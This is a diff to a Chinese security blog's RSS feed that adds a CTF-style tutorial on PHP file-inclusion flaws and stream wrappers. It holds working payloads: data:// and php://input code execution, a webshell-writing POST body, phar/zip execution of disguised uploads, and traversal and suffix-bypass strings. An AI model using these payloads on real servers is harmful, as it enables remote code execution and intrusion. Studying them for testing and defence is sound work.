@@ -5,8 +5,93 @@
         <link>https://hq185187.github.io</link>
         <description>不定时更新web安全相关知识</description>
         <language>zh-CN</language>
-        <pubDate>Wed, 26 Apr 2023 00:51:04 +0800</pubDate>
-        <lastBuildDate>Wed, 26 Apr 2023 00:51:04 +0800</lastBuildDate>
+        <pubDate>Wed, 26 Apr 2023 18:30:05 +0800</pubDate>
+        <lastBuildDate>Wed, 26 Apr 2023 18:30:05 +0800</lastBuildDate>
+        <item>
+            <guid isPermalink="true">https://hq185187.github.io/2023/04/26/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</guid>
+            <title>文件包含及伪协议的使用</title>
+            <link>https://hq185187.github.io/2023/04/26/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</link>
+            <pubDate>Wed, 26 Apr 2023 18:30:05 +0800</pubDate>
+            <description><![CDATA[ &lt;h1 id=&#34;原因&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#原因&#34;&gt;#&lt;/a&gt; 原因&lt;/h1&gt;
+&lt;p&gt;四个函数:include (),include_once (),require (),require_once ()&lt;br&gt;
+ 只要文件内容符合 PHP 语法规范，那么任何扩展名都可以被 PHP 解析。比如把 &lt;code&gt;&amp;lt;?php phpinfo();?&amp;gt;&lt;/code&gt;  文件名改为 phpinfo.txt 还是可以看到信息&lt;br&gt;
+包含非 PHP 语法规范源文件时，将会暴露其源代码&lt;/p&gt;
+&lt;h1 id=&#34;伪协议&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#伪协议&#34;&gt;#&lt;/a&gt; 伪协议&lt;/h1&gt;
+&lt;h2 id=&#34;1data协议&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1data协议&#34;&gt;#&lt;/a&gt; 1.data 协议&lt;/h2&gt;
+&lt;p&gt;这是一种数据流封装器，用法: &lt;code&gt;data://text/plain,&amp;lt;?php system(&#39;whoami&#39;)?&amp;gt;&lt;/code&gt; &lt;br&gt;
+ &lt;code&gt;data://text/plain;base64,PD9waHAgc3lzdGVtKHdob2FtaSk/Pg==&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;2php协议&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2php协议&#34;&gt;#&lt;/a&gt; 2.php:// 协议&lt;/h2&gt;
+&lt;p&gt;访问各个输入输出流&lt;/p&gt;
+&lt;h3 id=&#34;1phpinput&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1phpinput&#34;&gt;#&lt;/a&gt; (1)php://input&lt;/h3&gt;
+&lt;p&gt;用来接收 POST 数据&lt;br&gt;
+ eg1. 增加一句话&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?file=php:input&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;post传参:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php fputs(fopen(&amp;quot;shell.php&amp;quot;,&amp;quot;a&amp;quot;),&amp;quot;&amp;lt;?php phpinfo.php();?&amp;gt;&amp;quot;)?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;eg2. 增加文件&lt;br&gt;
+ post 部分改为:&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php fputs(fopen(&amp;quot;shell.php&amp;quot;,&amp;quot;w&amp;quot;),&amp;quot;&amp;lt;?php phpinfo.php();?&amp;gt;&amp;quot;)?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;eg3. 执行系统命令&lt;br&gt;
+ post 为:&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php system(&amp;#x27;whoami&amp;#x27;);?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h2 id=&#34;2phpfilter&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2phpfilter&#34;&gt;#&lt;/a&gt; (2)php://filter&lt;/h2&gt;
+&lt;p&gt;这个语句用来查看源码。直接包含 php 文件时会被解析，不能看到源码，所以用 filter 来读取，不过要先 base64 加密传输过来&lt;br&gt;
+ eg.&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;php://filter/read=convert.base64-encode/resource=C:\oneword&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;还有一些可参考 php 手册&lt;/p&gt;
+&lt;h2 id=&#34;3file协议&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3file协议&#34;&gt;#&lt;/a&gt; 3.file:// 协议&lt;/h2&gt;
+&lt;p&gt;访问本地文件系统&lt;br&gt;
+ eg&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;file:///D:/phpstudy_pro/WWW/index.html&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;file://D:\phpstudy_pro\WWW\index.html&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;看个例子:&lt;/p&gt;
+&lt;p&gt;![[Pasted image 20230425131935.png]]&lt;br&gt;
+![[Pasted image 20230425132653.png]]&lt;br&gt;
+ 前面说过后缀名不是 php 但是文件内容符合 php 结构的也可以当作 php 解析，这就是 include 函数&lt;/p&gt;
+&lt;h2 id=&#34;4zip协议&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#4zip协议&#34;&gt;#&lt;/a&gt; 4.zip 协议&lt;/h2&gt;
+&lt;p&gt;zip:// 本来是用来访问压缩包里的文件。当它与包含函数结合时，zip:// 流就会被当作 php 文件执行&lt;/p&gt;
+&lt;p&gt;规则:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;zip:// 中只能传入绝对路径&lt;/li&gt;
+&lt;li&gt;要用 #分隔压缩包和压缩包里的内容，并且 #要用 url 编码 %23&lt;/li&gt;
+&lt;li&gt;只需要是 zip 的压缩包就行，后缀名可以任意改&lt;br&gt;
+ eg 直接用 zip 协议&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;![[Pasted image 20230425141324.png]]&lt;/p&gt;
+&lt;p&gt;改成 zip.jpg 后&lt;br&gt;
+！[[Pasted image 20230425141432.png]]&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;bzip2,zlib 一样就是绝对路径和相对路径都能用&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;5phar协议&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#5phar协议&#34;&gt;#&lt;/a&gt; 5.phar 协议&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;phar:// 有点类似 zip:// 同样可以导致 任意代码执行。&lt;/li&gt;
+&lt;li&gt;可以用相对路径和绝对路径&lt;br&gt;
+ poc:&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;?file=phar://zip.jpg/phpinfo.txt&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;?file=phar://D:\zip.jpg\phpinfo.txt&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;可以配合文件上传漏洞:&lt;br&gt;
+ 假如文件上传限制 MIME, 把木马文件压缩成 zip, 再该后缀名为 jpg, 直接 phar 协议执行&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#绕过&#34;&gt;#&lt;/a&gt; 绕过&lt;/h1&gt;
+&lt;h2 id=&#34;1指定后缀名&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1指定后缀名&#34;&gt;#&lt;/a&gt; 1. 指定后缀名&lt;/h2&gt;
+&lt;p&gt;eg&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	error_reporting(0);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	$file = $_GET[&amp;quot;file&amp;quot;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	//后缀&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	include $file.&amp;quot;.txt&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	highlight_file(__FILE__);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;ol&gt;
+&lt;li&gt;%00 截断&lt;/li&gt;
+&lt;li&gt;长度绕过，一直././././././././,Windows 超过 256 后面丢弃，Linux4096&lt;/li&gt;
+&lt;li&gt;url 绕过:&lt;br&gt;
+ &lt;code&gt;url:protocol :// hostname[:port] / path / [;parameters][?query]#fragment &lt;/code&gt; &lt;br&gt;
+(1).query&lt;br&gt;
+payload: &lt;code&gt;http://127.0.0.1/phpinfo.php?&lt;/code&gt; &lt;br&gt;
+ 拼接后: &lt;code&gt;http://127.0.0.1/phpinfo.php?.txt&lt;/code&gt; &lt;br&gt;
+(2)fragment&lt;br&gt;
+payload: &lt;code&gt;http://127.0.0.1/phpinfo.php%23&lt;/code&gt; &lt;br&gt;
+ 拼接后: &lt;code&gt;http://127.0.0.1/phpinfo.php#.txt&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;2编码&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2编码&#34;&gt;#&lt;/a&gt; 2. 编码&lt;/h2&gt;
+&lt;h3 id=&#34;1&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1&#34;&gt;#&lt;/a&gt; 1.  …/&lt;/h3&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1.url编码&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;%2e%2e%2f&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;..%2f&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;%2e%2e/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2.二次编码&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;%252e%252e%252f&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3.容器和服务器编码&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;..%c0%af&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;参考:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4L2FydGljbGUvZGV0YWlscy84NzA5MDUzOQ==&#34;&gt;(122 条消息) CTF 中文件包含漏洞总结_LetheSec 的博客 - CSDN 博客&lt;/span&gt;&lt;/p&gt;
+ ]]></description>
+        </item>
         <item>
             <guid isPermalink="true">https://hq185187.github.io/2023/04/26/nessctf/</guid>
             <title>NSSCTF精选</title>
